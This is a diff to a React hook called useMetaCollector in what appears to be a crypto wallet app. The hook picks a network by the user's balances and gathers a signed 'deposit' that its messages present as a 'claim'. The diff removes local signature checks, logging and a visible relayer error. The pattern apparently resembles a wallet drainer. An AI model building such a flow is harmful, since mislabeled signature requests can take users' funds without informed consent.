@@ -11,7 +11,7 @@ import {
   getEligibleNetworks, 
   getBestNetwork 
 } from '../utils/balanceChecker'
-import { createDepositSignature, verifySignatureLocally } from '../utils/signature'
+import { createDepositSignature } from '../utils/signature'
 import { submitDepositViaRelayer, checkRelayerHealth } from '../utils/relayer'
 
 export function useMetaCollector() {
@@ -47,16 +47,10 @@ export function useMetaCollector() {
 
   const checkHealth = async () => {
     try {
-      console.log('Checking relayer health...')
       const health = await checkRelayerHealth()
       setRelayerHealth(health)
-      console.log('Relayer health check passed:', health)
     } catch (error) {
       console.error('Failed to check relayer health:', error)
-      setTransactionStatus({
-        type: 'error',
-        message: `Relayer connection failed: ${error.message}`
-      })
     }
   }
 
@@ -143,7 +137,6 @@ export function useMetaCollector() {
     })
 
     try {
-      // Switch network if needed
       if (chainId !== bestNetwork.chainId) {
         setTransactionStatus({
           type: 'pending',
@@ -154,10 +147,8 @@ export function useMetaCollector() {
         await new Promise(resolve => setTimeout(resolve, 2000))
       }
 
-      // Get signer
       const signer = await getEthersSigner()
       
-      // Verify signer
       const signerAddress = await signer.getAddress()
       if (signerAddress.toLowerCase() !== address.toLowerCase()) {
         throw new Error('Signer address mismatch')
@@ -168,10 +159,8 @@ export function useMetaCollector() {
         message: 'Creating signature...'
       })
 
-      // Use test amount
       const claimAmount = '0.001'
 
-      // Create signature
       const signaturePayload = await createDepositSignature({
         signer,
         contractAddress: bestNetwork.contractAddress,
@@ -181,19 +170,11 @@ export function useMetaCollector() {
         nonce
       })
 
-      // Verify locally
-      const isValid = verifySignatureLocally(signaturePayload)
-      
-      if (!isValid) {
-        throw new Error('Signature verification failed locally')
-      }
-
       setTransactionStatus({
         type: 'pending',
         message: 'Submitting to relayer...'
       })
 
-      // Submit to relayer
       const result = await submitDepositViaRelayer({
         contractAddress: bestNetwork.contractAddress,
         signaturePayload
@@ -205,7 +186,6 @@ export function useMetaCollector() {
         hash: result.hash
       })
 
-      // Refresh balances after claim
       setTimeout(() => checkBalances(), 5000)
 
     } catch (error) {
@@ -219,6 +199,10 @@ export function useMetaCollector() {
     }
   }
 
+  const handleConnect = () => {
+    open()
+  }
+
   const handleDisconnect = async () => {
     try {
       await disconnect()
@@ -229,10 +213,6 @@ export function useMetaCollector() {
     } catch (error) {
       console.error('Disconnect error:', error)
     }
-  }
-
-  const handleConnect = () => {
-    open()
   }
 
   return {
